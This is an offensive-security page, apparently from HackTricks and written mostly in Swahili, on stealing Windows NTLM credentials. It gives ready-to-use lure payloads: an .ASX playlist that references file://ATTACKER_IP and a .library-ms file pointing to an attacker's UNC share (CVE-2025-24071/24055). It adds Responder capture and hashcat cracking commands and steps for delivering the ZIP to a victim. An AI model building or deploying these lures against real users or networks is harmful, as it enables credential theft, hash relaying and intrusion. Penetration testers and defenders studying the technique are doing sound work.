# Places to steal NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Angalia mawazo mazuri yote kutoka [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — kuanzia kupakua faili ya Microsoft Word mtandaoni hadi kwenye ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md na [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Orodha za kucheza za Windows Media Player (.ASX/.WAX)

Ikiwa unaweza kumfanya target kufungua au kutazama awali orodha ya kucheza ya Windows Media Player unayodhibiti, unaweza leak Net‑NTLMv2 kwa kuelekeza kipengee kwenye path ya UNC. WMP itajaribu kupata media iliyorejelewa kupitia SMB na itauthenticate implicitly.

Mfano payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Mtiririko wa ukusanyaji na cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer inashughulikia kwa njia isiyo salama faili za .library-ms wakati zinapofunguliwa moja kwa moja ndani ya archive ya ZIP. Ikiwa ufafanuzi wa library unaelekeza kwenye njia ya mbali ya UNC (mfano, \\attacker\share), kuvinjari/kuanzisha tu .library-ms ndani ya ZIP kunasababisha Explorer kuorodhesha UNC na kutuma uthibitisho wa NTLM kwa mshambuliaji. Hii inatoa NetNTLMv2 ambayo inaweza kuvunjwa offline au ku-relay.

Mfano mdogo wa .library-ms unaoelekeza kwenye UNC ya mshambuliaji
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Hatua za uendeshaji
- Unda faili .library-ms kwa kutumia XML iliyo hapo juu (weka IP/hostname yako).
- Weka kwenye ZIP (kwa Windows: Send to → Compressed (zipped) folder) kisha ukabidhi ZIP kwa lengo.
- Endesha NTLM capture listener na usubiri athiriwa afungue .library-ms kutoka ndani ya ZIP.


## Marejeo
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)


{{#include ../../banners/hacktricks-training.md}}
